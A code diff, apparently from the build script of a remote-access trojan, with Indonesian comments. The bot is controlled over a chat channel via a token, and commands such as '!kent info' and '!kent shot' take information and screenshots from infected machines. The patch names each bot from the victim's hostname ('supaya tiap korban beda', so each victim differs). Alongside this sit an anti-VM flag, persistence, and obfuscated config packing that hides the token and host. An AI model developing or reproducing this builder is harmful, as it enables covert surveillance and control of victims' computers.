@@ -288,7 +288,8 @@ def main():
     ap.add_argument("--icon", default="")
     ap.add_argument("--uuid", default="")
     ap.add_argument("--alias", default="",
-                    help="nama pendek mesin: !a info. default: huruf pertama uuid")
+                    help="nama pendek mesin: !a info. default: otomatis dari nama "
+                         "host (PC-KENTANQ -> kent), supaya tiap korban beda")
     ap.add_argument("--poll", type=float, default=3.0)
     ap.add_argument("--api", default=DEFAULT_API)
     ap.add_argument("--anti-vm", action="store_true")
@@ -338,9 +339,11 @@ def main():
     if free_gb < 1.0:
         print("[!] drive kerja hampir penuh, build bisa gagal di tahap onefile")
     uid = args.uuid or str(uuidlib.uuid4())
-    alias = (args.alias or uid[:1]).strip()
-    if len(alias) > 3 or not alias.isalnum():
-        print("[!] alias harus 1-3 karakter alfanumerik, misal a, b, pc1")
+    # Alias kosong = ditentukan saat runtime dari nama host (core/net.auto_alias).
+    # Dulu di sini jatuh ke uid[:1], satu huruf hex yang bisa kembar antar mesin.
+    alias = (args.alias or "").strip().lower()
+    if alias and (len(alias) > 4 or not alias.isalnum()):
+        print("[!] alias harus 1-4 karakter alfanumerik, misal a, b, pc1")
         return 2
     key, blob = pack_config(args.token, int(args.channel), uid, args.name,
                             args.poll, args.anti_vm, not args.no_persist,
@@ -408,7 +411,11 @@ def main():
     else:
         print("[*] leak     : bersih (token & host nggak ada plaintext)")
     print("[*] manifest : %s" % os.path.join(args.out, args.name + ".json"))
-    print("[*] alias    : !%s  (mis. !%s info, !%s shot)" % (alias, alias, alias))
+    if alias:
+        print("[*] alias    : !%s  (mis. !%s info, !%s shot)" % (alias, alias, alias))
+    else:
+        print("[*] alias    : otomatis dari nama host saat jalan "
+              "(PC-KENTANQ -> !kent). lihat `who` di channel.")
     if args.engine == "folder":
         print("[*] folder mode butuh Python di target. Jalankan run.vbs, bukan entry.py.")
     if args.engine == "nuitka-dir":
